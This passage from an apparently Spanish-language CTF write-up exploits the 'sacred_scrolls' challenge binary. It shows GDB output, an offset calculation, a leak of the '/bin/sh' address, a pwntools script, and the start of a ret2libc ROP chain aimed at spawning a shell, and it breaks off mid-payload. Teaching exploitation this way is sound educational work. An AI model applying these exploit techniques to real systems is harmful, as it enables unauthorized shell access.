+Reading symbols from <span class="code-dark-green">sacred_scrolls</span>...
+(No debugging symbols found in <span class="code-dark-green">sacred_scrolls</span>)
+<span class="code-red">gef➤  </span>run
+Starting program: ./sacred_scrolls
+
+
+<span class="code-blue">                                            ▄▞▀▀▀▜▄▖</span>
+<span class="code-blue">          ▗     ▖       ▗     ▖       ▗  ▖▟▞▖▘▗▖▚▘ ▝▀▄</span>
+<span class="code-blue">   ▖▝  ▘ ▝   ▝    ▝  ▘ ▝   ▝    ▝  ▘ ▝ ▖▌▀ ▖▖▚▘▝▗▝▝ ▗▝▄▖▘ ▘</span>
+<span class="code-blue">                                   ▗▗▞▘▚▝▝▝▗▝  ▘   ▖  ▗▚▖</span>
+<span class="code-blue">              ▗  ▖  ▗       ▗  ▖▗▄▜▝▚▝▝▖▘▘▝   ▖ ▖ ▘ ▗ ▖▛▞</span>
+<span class="code-blue">   ▖  ▖▘ ▖ ▗ ▘         ▖ ▗▝  ▗▄▞▚▗▗▘ ▝           ▖ ▖ ▖▘▀▀▖</span>
+<span class="code-blue">                   ▖      ▗▖▛▚▗▝ ▖        ▗ ▝ ▝ ▘ ▖ ▘▗▗▗▝▌</span>
+<span class="code-blue">                 ▗    ▗▄▞▀▚▝ ▖          ▖▝  ▖▝ ▖▗ ▖▘▝▗▗▄▞▘</span>
+<span class="code-blue">  ▖ ▝     ▗     ▖  ▄▞▀▚▗▝▝  ▖        ▘ ▘ ▗▝ ▖ ▘▗▗▝▖▞▞▌▜▐▐▖</span>
+<span class="code-blue">        ▗     ▘▄▖▀▀▗▝▝▗ ▝         ▗ ▘ ▖▖▘▖▝▗ ▚▝▖▖▌▌▌▙▞▌▀</span>
+<span class="code-blue">       ▘   ▄▞▞▀▗▝▞▝▖▝           ▘▝  ▖▘▖▖▘▞▝▖▚▚▐▐▟▟▞▘▘</span>
+<span class="code-blue">    ▖▝ ▄▖▛▀▖▞▖▌▘▘▝▖      ▖▝ ▗ ▝ ▖▗ ▘▖▖▖▞▐▗▚▚▙▙▛▀▝</span>
+<span class="code-blue">   ▄▄▜▚▙▄▄▀▝▗ ▄▝▝▘  ▘ ▘ ▘    ▗ ▖▗ ▝▖▄▐▐▐▟▟▜▜▝             ▘</span>
+<span class="code-blue">  ▐▟▛█▜▚▚▚▞▄▖▘     ▖  ▗  ▗ ▘▝ ▖▗▗▐▝▄▟▞▙█▐▝</span>
+<span class="code-blue">  ▐▚▛▞▜▚▟ ▝▚▚ ▘▝ ▝  ▝▗ ▖▘ ▗▝▝▖▞▖▌▙▜▙▙▀▘      ▗ ▝     ▗  ▘</span>
+<span class="code-blue">  ▜▐▚▐▐▜▟█▖ ▀▙▖▗ ▖▗▝ ▖▗ ▖▘▖▞▞▟▞▛▛▟▀        ▗        ▘     ▖</span>
+<span class="code-blue">  ▝▛▗ ▖▌▙▙█▘ ▗▚ ▖▗ ▗▗▗▗▚▐▐▐▞▛▟▞▛▝                ▗▝</span>
+<span class="code-blue">   █ ▖▗▀▝▝▛█▗ ▜▘▖▗▝▗▗▚▚▚▙▜▞▙▜▝        ▝  ▘     ▗        ▖</span>
+<span class="code-blue">   ▐▖▖ ▚ ▚▜▜▖▞▐▚▗▗▐▗▜▞▛▙▚▙▀         ▝      ▗ ▘        ▗</span>
+<span class="code-blue">    ▚▝▖▚▚▖▀▛▞▐▟▚▘▌▌▛▙▜▟▝▘         ▗                  ▗</span>
+<span class="code-blue">  ▗ ▝▌▝▖▌▜▚▛▟█▛▙▜▞▛▛▞▘                ▖ ▝        ▖ ▗▝     ▘</span>
+<span class="code-blue">     ▝▙▗▐▐▐▜▜▙█▞▟▞▛▝             ▗   ▖    ▗  ▗ ▝</span>
+<span class="code-blue">     ▝▘▌▖▖▙▀▙▜▚▜▝             ▗ ▘</span>
+<span class="code-blue">        ▝▀▗▀▞▞▘▘      ▝  ▘ ▗▝           ▗               ▝</span>
+<span class="code-blue">  ▝ ▝            ▗▝                 ▘      ▝  ▝   ▖▝</span>
+<span class="code-blue">                                       ▘              ▝</span>
+
+<span class="code-blue">[Detaching after vfork from child process 3901791]</span>
+<span class="code-blue">[Detaching after vfork from child process 3901793]</span>
+
+<span class="code-green">[+] All ⅀ ℙ ∉ ⎳ ⎳ ⅀ have been whiped out..</span>
+
+<span class="code-blue">Enter your wizard tag: asdf</span>
+
+<span class="code-blue">Interact with magic library asdf</span>
+
+<span class="code-blue">1. Upload ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">2. Read   ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">2. Cast   ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">3. Leave</span>
+
+<span class="code-blue">&gt;&gt; 1</span>
+
+<span class="code-blue">[*] Enter file (it will be named spell.zip): UEsDBBQAAAAIAJWlhVU4LwDzOQAAAGsAAAAJABwAc3BlbGwudHh0VVQJAAMqSo5jKkqOY3V4CwABBOgDAAAE6AMAAA3DRw2EAAAAMK3szbGHDMKPD8EaCk4CbdL/fZzv9QSERsYmpmbmFpZW1ja2/uzsHRydnF1c3dz9AFBLAQIeAxQAAAAIAJWlhVU4LwDzOQAAAGsAAAAJABgAAAAAAAEAAAC0gQAAAABzcGVsbC50eHRVVAUAAypKjmN1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBPAAAAfAAAAAAA</span>  
+<span class="code-blue">[Detaching after vfork from child process 3902190]</span>
+
+<span class="code-green">[+] Spell has been added!</span>
+
+<span class="code-blue">1. Upload ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">2. Read   ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">2. Cast   ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">3. Leave</span>
+
+<span class="code-blue">&gt;&gt; 2</span>
+<span class="code-blue">[Detaching after vfork from child process 3902249]</span>
+<span class="code-blue">Archive:  spell.zip</span>
+<span class="code-blue">  inflating: spell.txt</span>
+
+<span class="code-blue">⅀ ℙ ∉ ⎳ ⎳: 👓⚡aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span>
+
+<span class="code-blue">1. Upload ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">2. Read   ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">2. Cast   ⅀ ℙ ∉ ⎳ ⎳</span>
+<span class="code-blue">3. Leave</span>
+
+<span class="code-blue">&gt;&gt; 3</span>
+
+<span class="code-red">[-] This spell is not quiet effective, thus it will not be saved!</span>
+
+<span class="code-red">Program received signal SIGSEGV, Segmentation fault.</span>
+<span class="code-blue">0x0000000000400ee1</span> in <span class="code-dark-yellow">spell_save</span> ()
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/s $rsp
+<span class="code-dark-blue">0x7fffffffdf88</span>: "aaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"  
+<span class="code-green">gef➤  </span>x/i $rip
+=&gt; <span class="code-dark-blue">0x400ee1</span> &lt;<span class="code-dark-yellow">spell_save</span>+62&gt;:    ret
+</code></pre></div><p>Y aquí hemos causado el <em>Buffer Overflow</em>. El programa se ha detenido (violación de segmento, <em>segmentation fault</em>) porque la instrucción <code>ret</code> está tratando de usar <code>aaajaaak</code> como la dirección de retorno, que evidentemente no es válida.</p><p>Usando <code>pwn cyclic</code> de nuevo, podemos encontrar el <em>offset</em> donde se encuentra <code>aaaj</code> en el patrón:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwn</span> cyclic -l aaaj  
+33
+</code></pre></div><p>Por lo tanto, necesitaremos los dos <em>emoji</em> y 33 caracteres adicionales para alcanzar la posición de la dirección de retorno.</p><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Recordemos que el binario ya ha tiene <code>system</code> cargada. Podemos encontrarla en <code>0x400820</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">sacred_scrolls</span> | <span class="code-dark-green">grep</span> system
+0000000000400820 &lt;<span class="code-red">system</span>@plt&gt;:
+  400820:       ff 25 6a 27 20 00       jmp    QWORD PTR [rip+0x20276a]        # 602f90 &lt;<span class="code-red">system</span>@GLIBC_2.2.5&gt;  
+  400a28:       e8 f3 fd ff ff          call   400820 &lt;<span class="code-red">system</span>@plt&gt;
+  400a34:       e8 e7 fd ff ff          call   400820 &lt;<span class="code-red">system</span>@plt&gt;
+  400c9a:       e8 af fb ff ff          call   400820 &lt;<span class="code-red">system</span>@plt&gt;
+  400d29:       e8 20 fb ff ff          call   400820 &lt;<span class="code-red">system</span>@plt&gt;
+</code></pre></div><p>El objetivo del <em>exploit</em> es llamar a <code>system("/bin/sh")</code>. Para eso, necesitamos encontrar la dirección de <code>"/bin/sh"</code> en tiempo de ejecución debido a ASLR. Esta protección afecta a librerías compartidas como Glibc y binarios con PIE (que no es el caso en este reto). Para burlar ASLR en Glibc, debemos obtener una fuga de memoria de en tiempo de ejecución, para poder calcular la dirección base y luego calcular cualquier objeto usando <em>offsets</em>.</p><p>Aunque podríamos hacer la técnica clásica de usar <code>put</code> para fugar una dirección almacenada en la GOT, esta vez encontré una manera más fácil. Teniendo en cuenta que en <code>main</code> se nos pide una etiqueta de asistente. Es un poco extraño que el programa lea hasta 1535 bytes para una cadena que no sirve para nada:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Enter your wizard tag: "</span><span class="mtk1">);</span>  
+<span class="mtk1">  local_2c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">600</span><span class="mtk1">;</span>
+<span class="mtk1">  local_38 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">5ff</span><span class="mtk1">;</span>
+
+<span class="mtk1">  wizard_tag_copy </span><span class="mtk5">=</span><span class="mtk1"> wizard_tag;</span>
+<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, wizard_tag, </span><span class="mtk6">1535</span><span class="mtk1">);</span>
+</code></pre></div><p>Usemos GDB para examinar la dirección de memoria de <code>wizard_tag</code> antes de escribir cualquier información:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">sacred_scrolls</span>
+Reading symbols from <span class="code-dark-green">sacred_scrolls</span>...
+(No debugging symbols found in <span class="code-dark-green">sacred_scrolls</span>)
+<span class="code-red">gef➤  </span>run
+Starting program: ./sacred_scrolls
+
+
+<span class="code-blue">                                            ▄▞▀▀▀▜▄▖</span>
+<span class="code-blue">          ▗     ▖       ▗     ▖       ▗  ▖▟▞▖▘▗▖▚▘ ▝▀▄</span>
+<span class="code-blue">   ▖▝  ▘ ▝   ▝    ▝  ▘ ▝   ▝    ▝  ▘ ▝ ▖▌▀ ▖▖▚▘▝▗▝▝ ▗▝▄▖▘ ▘</span>  
+<span class="code-blue">                                   ▗▗▞▘▚▝▝▝▗▝  ▘   ▖  ▗▚▖</span>
+<span class="code-blue">              ▗  ▖  ▗       ▗  ▖▗▄▜▝▚▝▝▖▘▘▝   ▖ ▖ ▘ ▗ ▖▛▞</span>
+<span class="code-blue">   ▖  ▖▘ ▖ ▗ ▘         ▖ ▗▝  ▗▄▞▚▗▗▘ ▝           ▖ ▖ ▖▘▀▀▖</span>
+<span class="code-blue">                   ▖      ▗▖▛▚▗▝ ▖        ▗ ▝ ▝ ▘ ▖ ▘▗▗▗▝▌</span>
+<span class="code-blue">                 ▗    ▗▄▞▀▚▝ ▖          ▖▝  ▖▝ ▖▗ ▖▘▝▗▗▄▞▘</span>
+<span class="code-blue">  ▖ ▝     ▗     ▖  ▄▞▀▚▗▝▝  ▖        ▘ ▘ ▗▝ ▖ ▘▗▗▝▖▞▞▌▜▐▐▖</span>
+<span class="code-blue">        ▗     ▘▄▖▀▀▗▝▝▗ ▝         ▗ ▘ ▖▖▘▖▝▗ ▚▝▖▖▌▌▌▙▞▌▀</span>
+<span class="code-blue">       ▘   ▄▞▞▀▗▝▞▝▖▝           ▘▝  ▖▘▖▖▘▞▝▖▚▚▐▐▟▟▞▘▘</span>
+<span class="code-blue">    ▖▝ ▄▖▛▀▖▞▖▌▘▘▝▖      ▖▝ ▗ ▝ ▖▗ ▘▖▖▖▞▐▗▚▚▙▙▛▀▝</span>
+<span class="code-blue">   ▄▄▜▚▙▄▄▀▝▗ ▄▝▝▘  ▘ ▘ ▘    ▗ ▖▗ ▝▖▄▐▐▐▟▟▜▜▝             ▘</span>
+<span class="code-blue">  ▐▟▛█▜▚▚▚▞▄▖▘     ▖  ▗  ▗ ▘▝ ▖▗▗▐▝▄▟▞▙█▐▝</span>
+<span class="code-blue">  ▐▚▛▞▜▚▟ ▝▚▚ ▘▝ ▝  ▝▗ ▖▘ ▗▝▝▖▞▖▌▙▜▙▙▀▘      ▗ ▝     ▗  ▘</span>
+<span class="code-blue">  ▜▐▚▐▐▜▟█▖ ▀▙▖▗ ▖▗▝ ▖▗ ▖▘▖▞▞▟▞▛▛▟▀        ▗        ▘     ▖</span>
+<span class="code-blue">  ▝▛▗ ▖▌▙▙█▘ ▗▚ ▖▗ ▗▗▗▗▚▐▐▐▞▛▟▞▛▝                ▗▝</span>
+<span class="code-blue">   █ ▖▗▀▝▝▛█▗ ▜▘▖▗▝▗▗▚▚▚▙▜▞▙▜▝        ▝  ▘     ▗        ▖</span>
+<span class="code-blue">   ▐▖▖ ▚ ▚▜▜▖▞▐▚▗▗▐▗▜▞▛▙▚▙▀         ▝      ▗ ▘        ▗</span>
+<span class="code-blue">    ▚▝▖▚▚▖▀▛▞▐▟▚▘▌▌▛▙▜▟▝▘         ▗                  ▗</span>
+<span class="code-blue">  ▗ ▝▌▝▖▌▜▚▛▟█▛▙▜▞▛▛▞▘                ▖ ▝        ▖ ▗▝     ▘</span>
+<span class="code-blue">     ▝▙▗▐▐▐▜▜▙█▞▟▞▛▝             ▗   ▖    ▗  ▗ ▝</span>
+<span class="code-blue">     ▝▘▌▖▖▙▀▙▜▚▜▝             ▗ ▘</span>
+<span class="code-blue">        ▝▀▗▀▞▞▘▘      ▝  ▘ ▗▝           ▗               ▝</span>
+<span class="code-blue">  ▝ ▝            ▗▝                 ▘      ▝  ▝   ▖▝</span>
+<span class="code-blue">                                       ▘              ▝</span>
+
+<span class="code-blue">[Detaching after vfork from child process 3909266]</span>
+<span class="code-blue">[Detaching after vfork from child process 3909268]</span>
+
+<span class="code-green">[+] All ⅀ ℙ ∉ ⎳ ⎳ ⅀ have been whiped out..</span>
+
+<span class="code-blue">Enter your wizard tag: ^C</span>
+<span class="code-blue">Program received signal SIGINT, Interrupt.</span>
+<span class="code-blue">0x00007ffff7ea7992</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./glibc/libc.so.6
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/i $rip
+=&gt; <span class="code-dark-blue">0x7ffff7ea7992</span> &lt;<span class="code-dark-yellow">read</span>+18&gt;:    cmp    rax,0xfffffffffffff000  
+<span class="code-green">gef➤  </span>x/50gx $rsi
+<span class="code-dark-blue">0x7fffffffdf90</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffdfa0</span>: 0x00007ffff7f6b698      0x00000000f7e7e0f0
+<span class="code-dark-blue">0x7fffffffdfb0</span>: 0x0000000000000000      0x00000000ffffe3e0
+<span class="code-dark-blue">0x7fffffffdfc0</span>: 0x00007fff00000000      0x0000000000000004
+<span class="code-dark-blue">0x7fffffffdfd0</span>: 0x00007fff00000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffdfe0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffdff0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe000</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe010</span>: 0x0000000000000000      0x00007ffff7fce37c
+<span class="code-dark-blue">0x7fffffffe020</span>: 0x00007ffff7fbb580      0x00007ffff7d97ad0
+<span class="code-dark-blue">0x7fffffffe030</span>: 0x00000000677f9a5f      0x00007ffff7d95424
+<span class="code-dark-blue">0x7fffffffe040</span>: 0x00007ffff7fbc088      0x00007ffff7fce7e9
+<span class="code-dark-blue">0x7fffffffe050</span>: 0x0000000000000226      0x00007ffff7da9650
+<span class="code-dark-blue">0x7fffffffe060</span>: 0x00007ffff7fbb580      0x00007fffffffe108
+<span class="code-dark-blue">0x7fffffffe070</span>: 0x0000000000000000      0x0000000004000000
+<span class="code-dark-blue">0x7fffffffe080</span>: 0x00007ffff7dd5520      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe090</span>: 0x00007ffff7ffe650      0x27d0436c9c8f4500
+<span class="code-dark-blue">0x7fffffffe0a0</span>: 0x00007fffffffe1d0      0x00000000004011a8
+<span class="code-dark-blue">0x7fffffffe0b0</span>: 0x00007fffffffe3e0      0x00007fffffffe240
+<span class="code-dark-blue">0x7fffffffe0c0</span>: 0x00007ffff7fae7a0      0x00007ffff7fae840
+<span class="code-dark-blue">0x7fffffffe0d0</span>: 0x00007ffff7ffd040      0x00007ffff7ea690b
+<span class="code-dark-blue">0x7fffffffe0e0</span>: 0x0000000000000000      0x00007ffff7e7e0f0
+<span class="code-dark-blue">0x7fffffffe0f0</span>: 0x00000001f7fc1300      0x27d0436c9c8f4500
+<span class="code-dark-blue">0x7fffffffe100</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7fffffffe110</span>: 0x0000000000000000      0x0000000004000000
+</code></pre></div><p>Hay muchas direcciones de memoria de Glibc (aquellas que comienzan con <code>0x7ffff7</code>) y de la pila (las que comienzan con <code>0x7ffffff</code>). Afortunadamente, la primera dirección que encontramos es curiosamente la dirección de <code>"/bin/sh"</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/s 0x00007ffff7f6b698  
+<span class="code-dark-blue">0x7ffff7f6b698</span>: "/bin/sh"
+</code></pre></div><p>También podríamos haber usado otras funciones para ver esta información:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>backtrace
+#0  <span class="code-dark-blue">0x00007ffff7ea7992</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./glibc/libc.so.6</span>
+#1  <span class="code-dark-blue">0x0000000000400f66</span> in <span class="code-dark-yellow">main</span> ()
+<span class="code-green">gef➤  </span>telescope
+<span class="code-dark-cyan">0x007fffffffdf88</span>│+0x0000: <span class="code-dark-red">0x00000000400f66</span>  →  <span class="code-grey">&lt;main+178&gt; mov rax, QWORD PTR [rbp-0x38]</span> <span class="code-blue"> ← $rsp</span>  
+<span class="code-dark-cyan">0x007fffffffdf90</span>│+0x0008: 0x0000000000000000    <span class="code-blue"> ← $rsi</span>
+<span class="code-dark-cyan">0x007fffffffdf98</span>│+0x0010: 0x0000000000000000
+<span class="code-dark-cyan">0x007fffffffdfa0</span>│+0x0018: 0x007ffff7f6b698  →  0x68732f6e69622f ("<span class="code-dark-yellow">/bin/sh</span>"?)
+<span class="code-dark-cyan">0x007fffffffdfa8</span>│+0x0020: 0x00000000f7e7e0f0
+<span class="code-dark-cyan">0x007fffffffdfb0</span>│+0x0028: 0x0000000000000000
+<span class="code-dark-cyan">0x007fffffffdfb8</span>│+0x0030: 0x00000000ffffe3e0
+<span class="code-dark-cyan">0x007fffffffdfc0</span>│+0x0038: 0x00007fff00000000
+<span class="code-dark-cyan">0x007fffffffdfc8</span>│+0x0040: 0x0000000000000004
+<span class="code-dark-cyan">0x007fffffffdfd0</span>│+0x0048: 0x00007fff00000000
+</code></pre></div><p>Para filtrar este valor, debemos ingresar exactamente 16 bytes. Dado que las cadenas en C terminan con un byte nulo, si ingresamos 16 bytes, entonces <code>printf</code> imprimirá los mismos 16 bytes más la dirección de memoria de <code>"/bin/sh"</code> porque no hay byte nulo en el medio.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Vamos a comenzar por filtrar la dirección de <code>"/bin/sh"</code>. Podemos usar este <em>script</em> de Python:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>
+
+<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>
+
+<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'sacred_scrolls'</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1">.process()</span>
+
+<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter your wizard tag: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">bin_sh_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>  
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'"/bin/sh" address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+
+
+<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './sacred_scrolls'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-red">No canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './sacred_scrolls': pid 3915189  
+[<span class="code-blue">*</span>] "/bin/sh" address: 0x7f4cb61e7698
+[<span class="code-blue">*</span>] Switching to interactive mode
+1. Upload ⅀ ℙ ∉ ⎳ ⎳
+2. Read   ⅀ ℙ ∉ ⎳ ⎳
+2. Cast   ⅀ ℙ ∉ ⎳ ⎳
+3. Leave
+
+&gt;&gt; <span class="code-red">$</span>
+</code></pre></div><p>Ahí está. Ahora explotaremos la vulnerabilidad de <em>Buffer Overflow</em> para llamar <code>system("/bin/sh")</code> (esto se conoce como ataque Ret2Libc).</p><p>Como NX está habilitado, debemos usar <em>Return Oriented Programming</em> (ROP) para ejecutar código arbitrario. En los binarios x86_64, los argumentos para de llamada a funciones se almacenan en registros (en orden: <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;). Podemos establecer estos registros usando <em>gadgets</em>, que son conjuntos de instrucciones que terminan en <code>ret</code>. El propósito de usar <em>gadgets</em> es llenar la pila con punteros a <em>gadgets</em>, para que el programa ejecute un <em>gadget</em> y retorne al siguiente. Es por eso que este <em>payload</em> se conoce como cadena ROP o ROP <em>chain</em>.</p><p>Podemos encontrar un <em>gadget</em> útil para <code>$rdi</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">sacred_scrolls</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'pop rdi'</span>  
+0x00000000004011b3 : <span class="code-red">pop rdi</span> ; ret<
+</code></pre></div><p>Entonces, necesitamos definir esta cadena ROP:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">pop_rdi_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">4011b3</span>
+<span class="mtk1">    </span><span class="mtk1">system_plt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">400820</span>
+
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\xf0\x9f\x91\x93\xe2\x9a\xa1</span><span class="mtk4">'</span>  
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">33</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
